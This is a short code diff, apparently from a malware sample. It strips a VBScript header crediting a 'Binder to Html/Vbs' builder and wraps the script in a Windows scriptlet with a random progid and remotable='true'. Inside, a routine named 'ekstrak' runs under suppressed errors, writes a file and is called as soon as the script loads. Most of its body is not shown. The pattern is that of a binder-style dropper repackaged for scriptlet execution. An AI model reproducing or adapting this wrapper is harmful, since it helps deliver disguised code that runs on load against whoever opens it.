@@ -1,7 +1,18 @@
-'________________________________
-' Builder   : Binder to Html/Vbs
-' Programmer: Rudi Hidayat
-'________________________________
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="fjzmpcjvqp"
+    progid="fjzmpcjvqp"
+    version="1.00"
+    classid="{204774CF-D251-4F02-855B-2BE70585184B}"
+    remotable="true"
+	>
+</registration>
+
+<script language="VBScript">
+		<![CDATA[
+	
 
 Sub ekstrak
 On Error Resume Next
@@ -16,3 +27,9 @@ Next
 ts.Close
 End Sub
 ekstrak
+
+   
+		]]>
+</script>
+
+</scriptlet>
